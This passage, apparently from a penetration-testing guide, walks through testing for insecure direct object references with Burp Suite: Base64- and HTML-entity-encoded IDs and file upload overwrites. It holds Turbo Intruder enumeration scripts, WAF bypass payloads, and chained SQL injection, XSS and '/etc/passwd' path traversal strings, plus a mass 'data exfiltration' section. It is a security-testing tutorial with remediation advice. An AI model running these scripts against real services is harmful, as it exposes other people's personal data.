    for case in edge_cases:
        payloads.append(base64.b64encode(case.encode()).decode())
    
    return list(set(payloads))  # Remove duplicates
```

### **Step 7: Configure Intruder Payloads**

```
1. Payloads tab → Payload type: "Custom iterator"
2. Add processing rules:
   - Add: Base64-encode
   - Add: URL-encode (if needed)
   
3. Payload Options:
   - Start with [1-1000] range
   - Add common usernames
   - Add system IDs
```

### **Step 8: Advanced Fuzzing with Turbo Intruder**

```python
# Turbo Intruder script for Base64 IDOR
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # Generate Base64 variations
    for i in range(1, 1001):
        # Original number
        b64_encoded = base64.b64encode(str(i).encode()).decode()
        engine.queue(target.req.replace(b64_encoded, original_value))
        
        # Different encodings
        variations = [
            base64.b64encode(str(i).encode()).decode(),
            base64.b64encode(str(i).encode()).decode().rstrip('='),
            base64.b64encode(('0' + str(i)).encode()).decode(),
            base64.b64encode(('00' + str(i)).encode()).decode()
        ]
        
        for var in variations:
            engine.queue(target.req.replace(original_value, var))

def handleResponse(req, interesting):
    if '200 OK' in req.response:
        table.add(req)
```

---

## 🔬 **PHASE 4: DECODING & ANALYSIS**

### **Step 9: Burp Decoder Usage**

```
1. Select Base64 parameter
2. Send to Decoder (Ctrl+D)
3. Choose "Decode as" → Base64
4. Check decoded value pattern:
   - Is it numeric?
   - Is it a username?
   - Is it a file path?
   - Is it UUID/GUID?
```

### **Step 10: Custom Decoder Script**

```python
# Python script for Burp Extender
from burp import IBurpExtender, IContextMenuFactory
from javax.swing import JMenuItem
import base64

class BurpExtender(IBurpExtender, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Base64 IDOR Helper")
        callbacks.registerContextMenuFactory(self)
        
    def createMenuItems(self, invocation):
        menu = []
        menu.append(JMenuItem("Decode Base64 IDOR", 
                   actionPerformed=lambda x: self.decode_idor(invocation)))
        return menu
    
    def decode_idor(self, invocation):
        messages = invocation.getSelectedMessages()
        for message in messages:
            request = message.getRequest()
            analyzed = self._helpers.analyzeRequest(request)
            parameters = analyzed.getParameters()
            
            for param in parameters:
                value = param.getValue()
                try:
                    decoded = base64.b64decode(value)
                    print(f"Parameter: {param.getName()}")
                    print(f"Encoded: {value}")
                    print(f"Decoded: {decoded}")
                    print("-" * 40)
                except:
                    pass
```

---

## 🎨 **PHASE 5: EXPLOITATION**

### **Step 11: Crafting Exploit Payloads**

**Generate Exploit Wordlist:**
```bash
#!/bin/bash
# Generate Base64 encoded numeric IDs

for i in {1..1000}; do
    # Standard Base64
    echo -n $i | base64
    
    # Without padding
    echo -n $i | base64 | tr -d '='
    
    # URL-safe Base64
    echo -n $i | base64 | tr '+/' '-_' | tr -d '='
    
    # With newline
    echo $i | base64
done > b64_ids.txt
```

### **Step 12: Burp Repeater Testing**

```
1. Find interesting parameter in Proxy history
2. Right-click → Send to Repeater (Ctrl+R)
3. Modify Base64 value:
   Original: id=MTIz      # "123"
   Modified: id=MTI0      # "124"
   
4. Check response differences:
   - 200 OK vs 403/404
   - Content length
   - Response data (other user's info)
   - Error messages
```

### **Step 13: Automated Testing with Scanner**

**Create Active Scan Check:**
```python
def doActiveScan(baseRequestResponse, insertionPoint):
    # Get original value
    original = insertionPoint.getBaseValue()
    
    try:
        # Decode original
        decoded = base64.b64decode(original)
        
        # Try variations
        checks = [
            (int(decoded) + 1),
            (int(decoded) - 1),
            0,
            999999
        ]
        
        for check in checks:
            encoded = base64.b64encode(str(check).encode())
            checkRequest = insertionPoint.buildRequest(encoded)
            
            # Send request
            response = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest)
            
            # Analyze response
            if self.isInteresting(response):
                return [ScanIssue(...)]
                
    except:
        pass
```

---

## 📊 **PHASE 6: RESPONSE ANALYSIS**

### **Step 14: Comparison Techniques**

**Using Comparer Tool:**
```
1. Select two similar requests
2. Right-click → Send to Comparer (Ctrl+C)
3. Compare responses:
   - Words/request
   - Response times
   - Status codes
   - Content length
```

**Response Analysis Script:**
```python
def analyze_response(response):
    indicators = {
        'success': ['200 OK', '{"status":"success"'],
        'error': ['403 Forbidden', '404 Not Found', 'access denied'],
        'leak': ['email', 'password', 'ssn', 'credit card'],
        'redirect': ['302', 'Location:']
    }
    
    score = 0
    for category, patterns in indicators.items():
        for pattern in patterns:
            if pattern in response:
                if category == 'success':
                    score += 10
                elif category == 'leak':
                    score += 50
                    
    return score
```

---

## 🔧 **PHASE 7: ADVANCED TECHNIQUES**

### **Step 15: Multi-layer Encoding**

```python
# Test for double encoding
def test_double_encoding(original_value):
    exploits = []
    
    # Original number
    num = 123
    
    # Single Base64
    single = base64.b64encode(str(num).encode())
    
    # Double Base64
    double = base64.b64encode(single)
    
    # URL encode then Base64
    url_encoded = urllib.parse.quote(str(num))
    b64_url = base64.b64encode(url_encoded.encode())
    
    # Base64 then URL encode
    b64_first = base64.b64encode(str(num).encode())
    final = urllib.parse.quote(b64_first)
    
    return [single, double, b64_url, final]
```

### **Step 16: Encoding Variations Script**

```python
# Comprehensive encoding fuzzer
class Base64Fuzzer:
    def __init__(self, original_value):
        self.original = original_value
        
    def generate_variations(self):
        variations = []
        numbers = [int(self.original), 
                  int(self.original)+1, 
                  int(self.original)-1,
                  1, 0, 999999]
        
        for num in numbers:
            # Standard Base64
            std = base64.b64encode(str(num).encode())
            variations.append(std)
            
            # URL-safe Base64
            url_safe = base64.urlsafe_b64encode(str(num).encode())
            variations.append(url_safe)
            
            # Without padding
            no_pad = std.decode().rstrip('=')
            variations.append(no_pad.encode())
            
            # With multiple padding
            multi_pad = std + b'==='
            variations.append(multi_pad)
            
            # Different encodings of same number
            for fmt in ['{:d}', '{:04d}', '{:x}']:
                formatted = fmt.format(num).encode()
                variations.append(base64.b64encode(formatted))
                
        return list(set(variations))
```

---

## 📈 **PHASE 8: EXPLOITATION VALIDATION**

### **Step 17: Confirming the Vulnerability**

**Checklist for Confirmation:**
```
□ Can access another user's data
□ Received 200 OK with sensitive info
□ Response contains personal data (name, email, etc.)
□ Can modify another user's data
□ No CSRF/other protections bypassed
□ Consistent across multiple IDs
□ Works with different encoding variations
```

### **Step 18: Impact Assessment**

```python
def assess_impact(successful_exploit):
    impact_score = 0
    findings = []
    
    # Check data sensitivity
    if 'password' in response:
        impact_score += 10
        findings.append("Password exposure")
    
    if 'credit' in response or 'card' in response:
        impact_score += 20
        findings.append("Financial data exposure")
    
    if 'admin' in response or 'root' in response:
        impact_score += 15
        findings.append("Privileged account access")
    
    # Check write access
    if method in ['POST', 'PUT', 'DELETE']:
        impact_score += 5
        findings.append("Data modification possible")
    
    return {
        'score': impact_score,
        'findings': findings,
        'severity': 'Critical' if impact_score > 30 else 'High' if impact_score > 20 else 'Medium'
    }
```

---

## 📝 **PHASE 9: REPORTING**

### **Step 19: Generate Proof of Concept**

**Create POC Request/Response:**
```
=== VULNERABLE ENDPOINT ===
GET /api/user/MTI0 HTTP/1.1        # 124 in Base64
Host: example.com
Cookie: session=valid_session

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 124,
  "email": "victim@example.com",
  "name": "Victim User",
  "ssn": "123-45-6789",
  "credit_card": "4111-1111-1111-1111"
}

=== COMPARISON ===
Original (ID 123): 200 OK, own data
Modified (ID 124): 200 OK, victim's data
```

### **Step 20: Documentation Template**

```markdown
# IDOR Vulnerability Report: Base64 Encoded Parameters

## Vulnerability Type
Insecure Direct Object Reference (IDOR) via Base64 encoding

## Endpoint
`GET /api/user/{base64_id}`

## Description
The application uses Base64-encoded numeric IDs to reference user objects. 
These can be easily decoded and manipulated to access other users' data.

## Steps to Reproduce
1. Login as user "test"
2. GET /api/user/MTAw (Base64 of "100")
3. Decode to see your own data
4. Modify to MTI0 (Base64 of "124")
5. Observe victim's data in response

## Impact
- Unauthorized access to all user data
- PII exposure
- Potential account takeover
- Data breach risk

## CVSS Score
Base Score: 8.2 (High)
Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N

## Remediation
- Implement proper access controls
- Use indirect reference maps
- Add authorization checks
- Consider using UUIDs instead
- Rate limit API endpoints
```

---

## 🛡️ **PHASE 10: MITIGATION TESTING**

### **Step 21: Verify Fix**

```python
def test_mitigation(endpoint, payloads):
    results = []
    
    for payload in payloads:
        response = send_request(endpoint.replace('{id}', payload))
        
        if response.status_code == 200:
            # Check if data belongs to current user
            if is_authorized_user(response):
                results.append({'payload': payload, 'status': 'secure'})
            else:
                results.append({'payload': payload, 'status': 'vulnerable'})
        elif response.status_code in [403, 401, 404]:
            results.append({'payload': payload, 'status': 'blocked'})
            
    return results
```

---

## 🎯 **PRO TIPS**

### **Burp Shortcuts for IDOR Testing**
- `Ctrl+R`: Send to Repeater
- `Ctrl+I`: Send to Intruder
- `Ctrl+D`: Send to Decoder
- `Ctrl+C`: Send to Comparer
- `Ctrl+F`: Search in responses
- `Ctrl+Shift+F`: Filter history

### **Common Base64 Patterns**
- Numeric: `MTIz` (123)
- Email: `dXNlckBleGFtcGxlLmNvbQ==` (user@example.com)
- UUID: `ZjU2YzY3YjgtYzM4NC00...`
- Path: `L2hvbWUvdXNlci9maWxlLnR4dA==` (/home/user/file.txt)
- JSON: `eyJpZCI6MTIzLCJuYW1lIjoidGVzdCJ9`

### **Automation Scripts**
```bash
# Quick Base64 decode loop
while read line; do
    echo "$line -> $(echo -n "$line" | base64 -d 2>/dev/null)"
done < b64_params.txt

# Burp Suite automation with BChecks
bcheck run --file idor_base64.bcheck --target https://example.com
```

---

## 📚 **RESOURCES**

- **Burp Extensions**: Base64 Decoder, Hackvertor, Turbo Intruder
- **Wordlists**: SecLists/Discovery/Web-Content/burp-parameter-names.txt
- **Practice Labs**: PortSwigger IDOR labs, PentesterLab Base64 challenges

---

# 🔍 **Bug #15: HTML Encoding IDOR - Complete Burp Suite Methodology**

## 📌 **Bug Description**
**HTML Encoding IDOR** - Manipulating IDs using HTML entities (e.g., `&#49;&#48;&#48;` for "100") to bypass input filters and access unauthorized resources.

---

## 🎯 **Target Scenarios**
- Applications using WAF/input filters
- APIs that decode HTML entities
- Forms with client-side validation only
- Legacy applications with improper decoding
- XML-based APIs accepting HTML entities

---

## 📊 **Detection Methodology**

### **Phase 1: Reconnaissance**

#### **1.1 Map the Application**
```
Target: https://target.com
Tools: Burp Suite (Spider + Target tab)

Steps:
1. Configure Burp browser
2. Turn on Intercept (Proxy → Intercept → Intercept is on)
3. Browse application normally
4. Note all endpoints with ID parameters
```

#### **1.2 Identify Potential Parameters**
```bash
Common parameter names to look for:
- id, user_id, account_id, profile_id
- file_id, document_id, message_id
- order_id, transaction_id, payment_id
- uid, pid, ref, reference
- item, product, category
```

#### **1.3 Create Parameter List**
```
Burp → Target → Site map
Right-click → Add to Scope
Filter by parameter names
Export to Intruder later
```

---

## 🔧 **Phase 2: Setup Burp Suite**

### **2.1 Configure Burp for HTML Encoding**

#### **Burp Professional Setup:**
```yaml
Proxy Settings:
- Enable Intercept
- Set Intercept Client Requests: "All"
- Enable "Match and Replace" rules
```

#### **Custom Match/Replace Rules:**
```
Add Rule:
  Match: ^(\d+)$
  Replace: HTML Entity of matched numbers
  Type: Request header/body
```

### **2.2 Install Extensions (Optional but Helpful)**
```
Extender → BApp Store → Install:
1. "Encoder" - Quick encoding/decoding
2. "Turbo Intruder" - Faster attacks
3. "Param Miner" - Discover hidden parameters
4. "HTTP Request Smuggler" - Advanced bypass
```

---

## 🎨 **Phase 3: HTML Entity Encoding Techniques**

### **3.1 HTML Entity Reference Table**
```html
<!-- Numeric Character References -->
Decimal: 100 = &#49;&#48;&#48;
Hex: 100 = &#x31;&#x30;&#x30;

<!-- Named Entities (limited use) -->
&lt; = <
&gt; = >
&amp; = &
&quot; = "
&apos; = '
```

### **3.2 Encoding Tools in Burp**

#### **Decoder Tool Usage:**
```
Burp → Decoder

Input: 100
Encode as: HTML Decimal
Result: &#49;&#48;&#48;

Input: 100
Encode as: HTML Hex
Result: &#x31;&#x30;&#x30;
```

#### **Encoder Tab in Intruder:**
```
Intruder → Payloads → Payload Encoding
Check: "URL-encode these characters"
Add custom HTML encoding rules
```

---

## ⚔️ **Phase 4: Attack Methodology**

### **4.1 Step 1: Baseline Request**
```http
GET /api/user/profile?id=100 HTTP/1.1
Host: target.com
Cookie: session=abc123

Response: 200 OK (Your profile)
```

### **4.2 Step 2: Test Basic IDOR**
```http
GET /api/user/profile?id=101 HTTP/1.1
Host: target.com
Cookie: session=abc123

Response: 403 Forbidden (Protected)
```

### **4.3 Step 3: HTML Entity Test**

#### **Using Repeater:**
```
Send request to Repeater (Ctrl+R)

Test 1 - Decimal Entity:
GET /api/user/profile?id=&#49;&#48;&#49; HTTP/1.1

Test 2 - Hex Entity:
GET /api/user/profile?id=&#x31;&#x30;&#x31; HTTP/1.1

Test 3 - Mixed Encoding:
GET /api/user/profile?id=&#49;0&#49; HTTP/1.1

Test 4 - Partial Entity:
GET /api/user/profile?id=1&#48;1 HTTP/1.1
```

### **4.4 Step 4: Automated Testing with Intruder**

#### **Intruder Setup:**

```yaml
Position: id=§100§

Payloads Tab:
1. Payload Type: "Custom Iterator"
2. Create 3 position iterator:
   - Position 1: [&#49;, &#x31;, 1] (digit 1 representations)
   - Position 2: [&#48;, &#x30;, 0] (digit 0 representations)  
   - Position 3: [&#49;, &#x31;, 1] (digit 1 representations)
3. Process: Combine in order

OR simpler:
Payload Type: "Numbers"
From: 1
To: 1000
Step: 1
Enable: "Encode payloads"
Custom Encoding: HTML Decimal/Hex
```

#### **Payload Generation Script:**
```python
# Use Burp's "Payload Generator" with this logic
def generate_payloads():
    digits = {
        '0': ['0', '&#48;', '&#x30;'],
        '1': ['1', '&#49;', '&#x31;'],
        '2': ['2', '&#50;', '&#x32;'],
        # ... for all digits
    }
    
    for i in range(100, 200):
        payload = ''
        for digit in str(i):
            payload += random.choice(digits[digit])
        yield payload
```

### **4.5 Step 5: Advanced Encoding Bypasses**

#### **Double Encoding:**
```http
First encode: 101 → &#49;&#48;&#49;
Second encode: &#49;&#48;&#49; → %26%2349%3B%26%2348%3B%26%2349%3B
Request: GET /api/user/profile?id=%26%2349%3B%26%2348%3B%26%2349%3B
```

#### **Mixed Case/Format:**
```http
GET /api/user/profile?id=&#49;&#48;&#49;   (decimal)
GET /api/user/profile?id=&#X31;&#X30;&#X31; (uppercase hex)
GET /api/user/profile?id=&#x0031;&#x0030;&#x0031; (padded hex)
GET /api/user/profile?id=&#00049;&#00048;&#00049; (padded decimal)
```

#### **Combined with other techniques:**
```http
# HTML Entity + Path Traversal
GET /api/user/profile?id=&#46;&#46;&#47;&#49;&#48;&#49; (../101)

# HTML Entity + Null Byte
GET /api/user/profile?id=&#49;&#48;&#49;%00

# HTML Entity + New Line
GET /api/user/profile?id=&#49;&#48;&#49;%0a
```

---

## 🔍 **Phase 5: Detection & Validation**

### **5.1 Response Analysis Matrix**

| Status Code | Content Length | Response Body | Verdict |
|------------|----------------|---------------|---------|
| 200 | 2450 | "John's Profile" | Vulnerable |
| 200 | 2450 | "Jane's Profile" | Vulnerable |
| 403 | 150 | "Access Denied" | Protected |
| 404 | 120 | "Not Found" | Invalid ID |
| 500 | 200 | Error | WAF Blocked |

### **5.2 Burp Filters for Detection**
```
Proxy → HTTP History → Filter Bar

Set filter to show:
- Status: 200, 302
- MIME type: HTML, JSON, XML
- Search: (profile|user|account|data)
```

### **5.3 Compare Responses**

#### **Using Comparer:**
```
1. Send original request (id=100) to Comparer
2. Send test request (id=&#49;&#48;&#49;) to Comparer
3. Compare responses for similarities
4. Look for personal data differences
```

#### **Using Intruder Grep:**
```
Intruder → Options → Grep - Extract
Add items to extract:
- Username: <span class="username">(.*?)</span>
- Email: <div class="email">(.*?)</div>
- Account number: "account":"(\d+)"
```

---

## 🛡️ **Phase 6: WAF Bypass Techniques**

### **6.1 Identify WAF**
```http
# Send malformed entity
GET /api/user/profile?id=&#9999999; HTTP/1.1

If response changes (blocked/200) → WAF present
```

### **6.2 WAF Bypass Payloads**

```http
# 1. Broken Entity
GET /api/user/profile?id=&#49;&#48 HTTP/1.1

# 2. Missing Semicolon
GET /api/user/profile?id=&#49101 HTTP/1.1

# 3. Overlong UTF-8
GET /api/user/profile?id=%C0%AE%C0%AE%C0%AF101

# 4. Unicode Fullwidth
GET /api/user/profile?id=％３１％３０％３１

# 5. Tab between & and #
GET /api/user/profile?id=&#9;49;&#9;48;&#9;49;

# 6. Line breaks in entity
GET /api/user/profile?id=&#49;%0a&#48;%0a&#49;

# 7. Null bytes between digits
GET /api/user/profile?id=&#49;%00&#48;%00&#49;
```

### **6.3 Progressive Bypass Strategy**
```
Level 1: Basic entities → Blocked
Level 2: Mixed entities → Blocked  
Level 3: Double encoded → Allowed
Level 4: Split entities → Allowed
Level 5: Unicode variants → Allowed
```

---

## 📊 **Phase 7: Automation with Turbo Intruder**

### **7.1 Python Script for Turbo Intruder**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)

    # Generate HTML entity payloads
    for id in range(100, 200):
        # Decimal entity
        dec_entity = ''.join(f'&#{ord(d)};' for d in str(id))
        engine.queue(target.req, dec_entity)
        
        # Hex entity  
        hex_entity = ''.join(f'&#x{ord(d):x};' for d in str(id))
        engine.queue(target.req, hex_entity)
        
        # Mixed encoding
        mixed = ''
        for i, d in enumerate(str(id)):
            if i % 2 == 0:
                mixed += f'&#{ord(d)};'
            else:
                mixed += f'&#x{ord(d):x};'
        engine.queue(target.req, mixed)

def handleResponse(req, interesting):
    if '200' in req.response:
        print(f"Vulnerable: {req.path}?id={req.payload}")
        table.add(req)
```

### **7.2 Run Turbo Intruder**
```
1. Right-click request → Extensions → Turbo Intruder
2. Send to Turbo Intruder
3. Paste Python script
4. Click "Attack"
```

---

## 🔬 **Phase 8: Manual Testing Deep Dive**

### **8.1 Test Different Locations**

```http
# URL Path
GET /api/user/&#49;&#48;&#49; HTTP/1.1

# Query Parameter
GET /api/data?user_id=&#49;&#48;&#49; HTTP/1.1

# POST JSON
POST /api/update HTTP/1.1
Content-Type: application/json

{"id":"&#49;&#48;&#49;","name":"test"}

# POST Form
POST /api/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=&#49;&#48;&#49;&name=test

# Cookie
Cookie: user_id=&#49;&#48;&#49;; session=abc123

# Header
X-User-ID: &#49;&#48;&#49;
```

### **8.2 Test Different ID Types**

```http
# Numeric ID
?id=&#49;&#48;&#49;

# String ID  
?username=&#97;&#100;&#109;&#105;&#110; (admin)

# Email
?email=&#117;&#115;&#101;&#114;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;

# UUID (partial)
?id=&#49;&#50;&#51;&#101;&#52;&#53;&#54;&#55; (123e4567)
```

### **8.3 Context-Specific Testing**

```http
# File Download
GET /download?file=&#114;&#101;&#112;&#111;&#114;&#116;&#46;&#112;&#100;&#102; (report.pdf)

# Image Access  
GET /images/&#112;&#114;&#111;&#102;&#105;&#108;&#101;&#49;&#48;&#49;&#46;&#106;&#112;&#103;

# API Endpoint
GET /api/v1/users/&#49;&#48;&#49;/posts
```

---

## 📈 **Phase 9: Advanced Exploitation**

### **9.1 Chaining with Other Vulnerabilities**

```http
# 1. HTML Entity + SQL Injection
GET /api/search?q=&#39;&#32;&#79;&#82;&#32;&#49;&#61;&#49;&#59;&#45;&#45; (SQLi payload)

# 2. HTML Entity + XSS
GET /api/profile?id=&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;

# 3. HTML Entity + Path Traversal
GET /api/files?path=&#46;&#46;&#47;&#46;&#46;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;
```

### **9.2 Data Exfiltration**

```http
# Sequential extraction
1. Get user 100: /api/user/&#49;&#48;&#48;
2. Get user 101: /api/user/&#49;&#48;&#49;
3. Get user 102: /api/user/&#49;&#48;&#50;

# Batch extraction  
POST /api/users/batch
["&#49;&#48;&#48;", "&#49;&#48;&#49;", "&#49;&#48;&#50;"]

# Range extraction
GET /api/users?start=&#49;&#48;&#48;&end=&#50;&#48;&#48;
```

---

## 📝 **Phase 10: Reporting**

### **10.1 Documentation Template**

```markdown
# Vulnerability: HTML Encoded IDOR

## Description
The application fails to properly validate HTML-encoded object references,
allowing unauthorized access to other users' data.

## Endpoint
`GET /api/user/profile`

## Parameters
- `id` (accepts HTML entities)

## Proof of Concept
Original (authorized):
GET /api/user/profile?id=100

Exploit (HTML encoded):
GET /api/user/profile?id=&#49;&#48;&#49;

## Impact
- Access to other users' personal information
- PII disclosure
- Account takeover potential

## Remediation
1. Validate permissions server-side after decoding
2. Use indirect reference maps
3. Implement proper access controls
4. Disable HTML entity parsing in URLs
```

### **10.2 Evidence Collection**
```
Burp → Project Options → Save copies of:
1. Original request/response
2. Successful exploit request/response
3. Intruder attack results
4. Screenshots of accessed data
5. Timeline of testing
```

---

## 🛠️ **Phase 11: Custom Burp Extensions**

### **11.1 Create Simple Extension**
```python
from burp import IBurpExtender, IHttpListener
from java.net import URL

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("HTML Entity IDOR Finder")
        callbacks.registerHttpListener(self)
        
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return
            
        request = messageInfo.getRequest()
        analyzed = self._helpers.analyzeRequest(request)
        params = analyzed.getParameters()
        
        for param in params:
            if "id" in param.getName().lower():
                # Test HTML entity variants
                self.test_html_entity(messageInfo, param)
    
    def test_html_entity(self, messageInfo, param):
        # Implementation for testing
        pass
```

---

## ✅ **Phase 12: Validation Checklist**

- [ ] Found endpoint with ID parameter
- [ ] Confirmed parameter accepts HTML entities
- [ ] Successfully accessed another user's data
- [ ] Verified with multiple IDs
- [ ] Tested different HTTP methods
- [ ] Checked for WAF bypass
- [ ] Documented exact payload
- [ ] Captured evidence
- [ ] Assessed business impact
- [ ] Verified remediation suggestion

---

## 🎯 **Success Indicators**

```
✅ 200 OK with other user's data
✅ 302 Redirect to other user's session
✅ Partial data disclosure
✅ Different response length/behavior
✅ Error messages revealing data
```

---

## ⚠️ **Common Pitfalls**

1. **Not checking URL decoding order**
2. **Missing double-encoded payloads**  
3. **Ignoring response differences**
4. **Not testing all parameter locations**
5. **Stopping at first success**

---

## 🔗 **Resources**

- Burp Suite Documentation: portswigger.net/burp/documentation
- HTML Entity Reference: dev.w3.org/html5/html-author/charref
- OWASP IDOR Guide: owasp.org/IDOR
- PortSwigger IDOR Labs: portswigger.net/web-security/access-control/idor

---

# 📁 **Bug #17: File Upload IDOR - Full Burp Suite Methodology**

## **Bug Description:** Overwriting other users' files via insecure direct object references in file upload functionality

---

## 🎯 **UNDERSTANDING THE VULNERABILITY**

### **What is File Upload IDOR?**
When an application allows users to upload files but doesn't properly verify ownership when:
- **Overwriting** existing files
- **Accessing** other users' files
- **Deleting** others' files
- **Modifying** file metadata

### **Common Vulnerable Scenarios**
- Profile picture uploads
- Document management systems
- File sharing platforms
- Cloud storage applications
- Attachment functionality
- Resume/CV uploads

---

## 🔍 **RECONNAISSANCE PHASE**

### **Step 1: Map File Upload Endpoints**

**Using Burp Target Tab:**
1. Navigate through the application
2. Look for:
   ```
   /upload
   /file-upload
   /profile/picture
   /documents/upload
   /api/files/upload
   /user/avatar
   /attachments
   ```

**Using Burp Sitemap:**
```
Target > Site map > Filter by MIME type (images, documents)
Look for POST requests with multipart/form-data
```

### **Step 2: Identify File Naming Patterns**

Create two test accounts: **UserA** and **UserB**

**For UserA:**
1. Upload a file named `test1.jpg`
2. Capture request in Burp
3. Note the response and file path returned

**Example Request:**
```
POST /upload HTTP/1.1
Host: target.com
Cookie: session=USERA_SESSION

Content-Disposition: form-data; name="file"; filename="test1.jpg"
Content-Type: image/jpeg

[FILE DATA]
```

**Example Response:**
```json
{
  "success": true,
  "fileId": "5487",
  "fileUrl": "/uploads/5487_test1.jpg",
  "message": "File uploaded successfully"
}
```

### **Step 3: Analyze File Naming Convention**

Look for patterns:
- Sequential IDs: `file_1.jpg`, `file_2.jpg`
- User-based: `user123_photo.jpg`
- Timestamp-based: `20240219123045_test.jpg`
- UUID-based: `f47ac10b-58cc-4372-a567-0e02b2c3d479.jpg`
- Hash-based: `md5(filename+timestamp).jpg`

---

## 🧪 **TESTING METHODOLOGY**

### **Step 4: Identify File Parameters to Manipulate**

**Common Parameters to Test:**
```
file_id
fileId
documentId
attachmentId
filename
filePath
fileUrl
imageId
avatarId
profilePic
resourceId
```

### **Step 5: Basic IDOR Tests**

**Test Case 1: Sequential ID Manipulation**

Using Burp Repeater:
1. Upload file as UserA → get fileId=100
2. Switch to UserB session
3. Try accessing/modifying fileId=100

**Request Modification:**
```
Original (UserB upload):
POST /upload HTTP/1.1
Cookie: session=USERB_SESSION

fileId=200&filename=testB.jpg

Modified (Attempt to overwrite UserA's file):
POST /upload HTTP/1.1
Cookie: session=USERB_SESSION

fileId=100&filename=testB.jpg
```

### **Step 6: Parameter Location Testing**

**Test different locations for the file identifier:**

**URL Path:**
```
GET /files/100 HTTP/1.1
Cookie: session=USERB_SESSION
```

**Query Parameter:**
```
GET /files?fileId=100 HTTP/1.1
Cookie: session=USERB_SESSION
```

**POST Body:**
```
POST /files/update HTTP/1.1
Cookie: session=USERB_SESSION
Content-Type: application/x-www-form-urlencoded

fileId=100&action=delete
```

**JSON Body:**
```
POST /api/files/update HTTP/1.1
Cookie: session=USERB_SESSION
Content-Type: application/json

{"fileId": 100, "action": "overwrite"}
```

**Multipart:**
```
POST /upload HTTP/1.1
Cookie: session=USERB_SESSION
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="fileId"

100
--xxx
Content-Disposition: form-data; name="file"; filename="malicious.jpg"
Content-Type: image/jpeg

[FILE DATA]
```

---

## 🔄 **ADVANCED TESTING TECHNIQUES**

### **Step 7: Burp Intruder Setup for ID Enumeration**

**Target:** `/files/update`
**Parameter:** `fileId=§100§`

**Payloads Configuration:**
```
Payload type: Numbers
Number range: 1-1000
Step: 1
Number format: Decimal
```

**Attack Types:**
1. **Sniper** - Single parameter fuzzing
2. **Battering ram** - Multiple parameters same value
3. **Pitchfork** - Different payload sets
4. **Cluster bomb** - Multiple parameter combinations

### **Step 8: Grep Match Setup**

**Add grep extract rules for:**
```
"success": true
"fileUrl"
"owner": "userA"
"permission denied"
"unauthorized"
404 vs 200 responses
```

### **Step 9: File Operation Testing Matrix**

Create a testing matrix in Burp:

| Operation | UserA File | UserB Attempt | Expected | Actual |
|-----------|------------|---------------|----------|---------|
| View | 100 | 100 | 403 | ? |
| Download | 100 | 100 | 403 | ? |
| Update | 100 | 100 | 403 | ? |
| Delete | 100 | 100 | 403 | ? |
| Overwrite | 100 | 100 | 403 | ? |
| Rename | 100 | 100 | 403 | ? |

---

## 🚀 **SPECIALIZED TESTING SCENARIOS**

### **Step 10: File Overwrite Techniques**

**Technique A: Direct ID Manipulation**
```
1. Upload file as UserA → fileId=100
2. Upload file as UserB with fileId=100
3. Check if UserA's file is replaced
```

**Technique B: PUT/DELETE Methods**
```
PUT /files/100 HTTP/1.1
Cookie: session=USERB_SESSION
Content-Type: image/jpeg

[Malicious file data]

DELETE /files/100 HTTP/1.1
Cookie: session=USERB_SESSION
```

**Technique C: Versioning Exploitation**
```
POST /files/version/100 HTTP/1.1
Cookie: session=USERB_SESSION
{"version": 2, "file": [malicious data]}
```

### **Step 11: Metadata Manipulation**

**Update file metadata to point to other users' files:**

```json
POST /files/update HTTP/1.1
Cookie: session=USERB_SESSION

{
  "fileId": 100,
  "metadata": {
    "owner": "userA",
    "permissions": "public",
    "path": "/uploads/userA_private.doc"
  }
}
```

### **Step 12: Path Traversal in Filename**

**Test path traversal in filename parameter:**

```
POST /upload HTTP/1.1
Cookie: session=USERB_SESSION

filename="../../../etc/passwd"
fileId=100
```

```
POST /files/update HTTP/1.1
Cookie: session=USERB_SESSION

newPath="../../../var/www/html/shell.php"
fileId=100
```

---

## 🔧 **BURP EXTENSIONS FOR IDOR TESTING**

### **Recommended Extensions:**

1. **Autorize** - Automates authorization tests
   ```
   Install: BApp Store > Autorize
   Configure: Set UserA as "Authorized", UserB as "Unauthorized"
   Run: Automatically tests all requests for IDOR
   ```

2. **Authz** - Test with different cookies
   ```
   Switch between UserA and UserB sessions easily
   Test same request with different auth contexts
   ```

3. **JSON Web Tokens** - Decode/modify JWT
   ```
   Check if user IDs are embedded in tokens
   Modify claims and re-encode
   ```

4. **Param Miner** - Discover hidden parameters
   ```
   Right-click > Extensions > Param Miner > Guess params
   Looks for parameters like fileId, docId, ownerId
   ```

5. **Turbo Intruder** - High-speed fuzzing
   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                              concurrentConnections=10,
                              requestsPerConnection=100,
                              pipeline=False)
       
       for fileId in range(1, 1000):
           engine.queue(target.req, str(fileId))
   ```

---

## 📊 **ANALYSIS TECHNIQUES**

### **Step 13: Response Analysis**

**Compare responses between UserA and UserB:**

```python
# Using Burp Comparer
1. Send UserA successful request to Comparer
2. Send UserB attempted request to Comparer
3. Compare responses for differences
```

**Look for:**
- Content-Length differences
- Status code variations
- Error message differences
- Response time variations

### **Step 14: Race Condition Testing**

**Test concurrent file operations:**

```python
